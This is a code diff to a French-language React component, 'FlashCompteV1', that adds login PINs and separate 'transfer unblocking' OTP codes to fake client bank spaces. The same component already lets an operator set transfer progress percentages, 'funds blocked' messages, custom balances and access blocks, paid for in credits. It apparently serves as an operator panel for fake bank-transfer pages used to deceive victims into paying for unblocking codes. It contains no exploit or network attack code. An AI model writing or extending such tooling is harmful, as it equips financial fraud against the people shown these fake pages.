@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { 
   Zap, 
   User, 
@@ -30,7 +30,7 @@ interface FlashCompteV1Props {
   setActiveTab: (tab: string) => void;
   setLiveSimulationTx: (transfer: SimulatedTransfer) => void;
   transfers: SimulatedTransfer[];
-  onUpdatePercentages: (id: string, start: number, stop: number, message: string, customBalance?: number) => void;
+  onUpdatePercentages: (id: string, start: number, stop: number, message: string, customBalance?: number, customOtpCode?: string) => void;
   onSetBlockedState: (id: string, isBlocked: boolean) => void;
   deductBalance: (amount: number) => void;
   balance: number;
@@ -58,6 +58,19 @@ export default function FlashCompteV1({
   const [email, setEmail] = useState('');
   const [address, setAddress] = useState('');
   const [language, setLanguage] = useState('Français');
+
+  const [customPinCode, setCustomPinCode] = useState('');
+  const [customOtpCode, setCustomOtpCode] = useState('');
+
+  useEffect(() => {
+    const generatedPin = Math.floor(100000 + Math.random() * 900000).toString();
+    let generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+    while (generatedOtp === generatedPin) {
+      generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+    }
+    setCustomPinCode(generatedPin);
+    setCustomOtpCode(generatedOtp);
+  }, []);
 
   const [senderBank, setSenderBank] = useState('');
   const [amount, setAmount] = useState('');
@@ -237,6 +250,7 @@ export default function FlashCompteV1({
   const [updateStopPercent, setUpdateStopPercent] = useState(85);
   const [updateMessage, setUpdateMessage] = useState('');
   const [updateCustomBalance, setUpdateCustomBalance] = useState<string>('');
+  const [updateOtpCode, setUpdateOtpCode] = useState('');
 
   // FORM 3: BLOCK / UNBLOCK ACCESS
   const [selectedBlockId, setSelectedBlockId] = useState('');
@@ -261,11 +275,13 @@ export default function FlashCompteV1({
       setUpdateStopPercent(target.stopPercentage);
       setUpdateMessage(target.customMessage);
       setUpdateCustomBalance(target.customBalance !== undefined ? target.customBalance.toString() : target.amount.toString());
+      setUpdateOtpCode(target.otpCode || '');
     } else {
       setUpdateStartPercent(15);
       setUpdateStopPercent(85);
       setUpdateMessage('');
       setUpdateCustomBalance('');
+      setUpdateOtpCode('');
     }
   };
 
@@ -283,6 +299,20 @@ export default function FlashCompteV1({
       return;
     }
 
+    const pin = customPinCode.trim() || Math.floor(100000 + Math.random() * 900000).toString();
+    let otp = customOtpCode.trim();
+    if (!otp) {
+      otp = Math.floor(100000 + Math.random() * 900000).toString();
+    }
+    while (otp === pin) {
+      otp = Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    if (customPinCode.trim() && customOtpCode.trim() && customPinCode.trim() === customOtpCode.trim()) {
+      alert("Le code de déblocage du virement doit être différent du code PIN de connexion à l'espace bancaire.");
+      return;
+    }
+
     // Cost computation: 3000 base + 1000 if SMS alert is selected (Total credits in image is 4000)
     const baseCost = 3000;
     const additionalCost = smsAlert ? 1000 : 0;
@@ -295,9 +325,6 @@ export default function FlashCompteV1({
 
     // Deduct cost from balance
     deductBalance(totalCost);
-
-    // Form random pin code (like 117850 in image)
-    const pin = Math.floor(100000 + Math.random() * 900000).toString();
 
     const recipientName = `${firstName.trim()} ${lastName.trim()}`;
     const mappedBank = senderBank.trim() || 'Ecobank Côte d\'Ivoire';
@@ -330,7 +357,7 @@ export default function FlashCompteV1({
       reference: txRef,
       status: 'SUCCESS',
       delaySeconds: 4,
-      otpCode: '',
+      otpCode: otp,
       feePercent: 0.1
     });
 
@@ -345,6 +372,15 @@ export default function FlashCompteV1({
     setEmail('');
     setAddress('');
     setAmount('');
+
+    // Pre-generate new different PIN/OTP values for next client creation
+    const generatedPin = Math.floor(100000 + Math.random() * 900000).toString();
+    let generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+    while (generatedOtp === generatedPin) {
+      generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+    }
+    setCustomPinCode(generatedPin);
+    setCustomOtpCode(generatedOtp);
   };
 
   const applyUpdate = (e: React.FormEvent) => {
@@ -353,17 +389,24 @@ export default function FlashCompteV1({
       alert('Veuillez sélectionner un accès client dans la liste.');
       return;
     }
+    const target = transfers.find(t => t.id === selectedUpdateId);
+    if (target && updateOtpCode.trim() && updateOtpCode.trim() === target.codePin.trim()) {
+      alert("Le code de déblocage du virement doit être différent du code PIN de connexion à l'espace bancaire.");
+      return;
+    }
     const balanceNum = parseFloat(updateCustomBalance);
     onUpdatePercentages(
       selectedUpdateId, 
       Number(updateStartPercent), 
       Number(updateStopPercent), 
       updateMessage,
-      isNaN(balanceNum) ? undefined : balanceNum
+      isNaN(balanceNum) ? undefined : balanceNum,
+      updateOtpCode.trim() || undefined
     );
     setSelectedUpdateId('');
     setUpdateMessage('');
     setUpdateCustomBalance('');
+    setUpdateOtpCode('');
   };
 
   const handleCopyToClipboard = (text: string, toastMessage: string) => {
@@ -621,6 +664,33 @@ export default function FlashCompteV1({
                     placeholder="Entrez le message indicatif de blocage de fonds ou d'acheminement..."
                   />
                 </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                  <div>
+                    <label className="text-xs text-slate-400 block mb-1">Code PIN de connexion à l'espace bancaire <span className="text-red-500 font-bold">*</span></label>
+                    <input
+                      type="text"
+                      required
+                      maxLength={6}
+                      value={customPinCode}
+                      onChange={(e) => setCustomPinCode(e.target.value.replace(/[^0-9]/g, ''))}
+                      className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-blue-500 font-bold"
+                      placeholder="Ex: 112233"
+                    />
+                  </div>
+                  <div>
+                    <label className="text-xs text-slate-300 block mb-1">Code de déblocage du virement (OTP) <span className="text-red-500 font-bold">*</span></label>
+                    <input
+                      type="text"
+                      required
+                      maxLength={6}
+                      value={customOtpCode}
+                      onChange={(e) => setCustomOtpCode(e.target.value.replace(/[^0-9]/g, ''))}
+                      className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-amber-400 font-black font-mono focus:outline-none focus:border-blue-500"
+                      placeholder="Ex: 448833"
+                    />
+                  </div>
+                </div>
               </div>
 
               {/* Alert Blocks */}
@@ -777,6 +847,24 @@ export default function FlashCompteV1({
                     </div>
                     <p className="text-[9px] text-slate-500 mt-1 leading-normal">
                       Modifiez le solde en direct de l'espace client ou cliquez sur réinitialiser pour reprendre le montant initial ({getSelectedClientInfoForUpdate()?.amount.toLocaleString('fr-FR')} {getSelectedClientInfoForUpdate()?.currency}).
+                    </p>
+                  </div>
+
+                  <div>
+                    <label className="text-[10px] font-mono text-slate-400 block mb-1">
+                      Code de déblocage du virement (OTP)
+                    </label>
+                    <input
+                      type="text"
+                      maxLength={6}
+                      required
+                      value={updateOtpCode}
+                      onChange={(e) => setUpdateOtpCode(e.target.value.replace(/[^0-9]/g, ''))}
+                      className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500 rounded-xl px-3 py-1.5 text-xs text-amber-400 font-bold font-mono focus:outline-none"
+                      placeholder="Modifier le code de déblocage"
+                    />
+                    <p className="text-[9px] text-slate-500 mt-1 leading-normal">
+                      Ce code est distinct du code PIN d'accès de connexion. Vous pouvez le modifier à tout moment.
                     </p>
                   </div>
 
@@ -1267,8 +1355,10 @@ export default function FlashCompteV1({
                 </div>
                 <div>
                   <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Code déjà utilisé :</span>
-                  <span className="inline-block bg-orange-500 text-white font-extrabold text-[10px] px-2.5 py-0.5 rounded uppercase mt-1 tracking-wider">
-                    NON
+                  <span className={`inline-block font-extrabold text-[10px] px-2.5 py-0.5 rounded uppercase mt-1 tracking-wider text-white ${
+                    (transfers.find(t => t.id === createdTx.id) || createdTx).isCompleted ? 'bg-emerald-600' : 'bg-orange-500'
+                  }`}>
+                    {(transfers.find(t => t.id === createdTx.id) || createdTx).isCompleted ? 'OUI' : 'NON'}
                   </span>
                 </div>
                 <div>
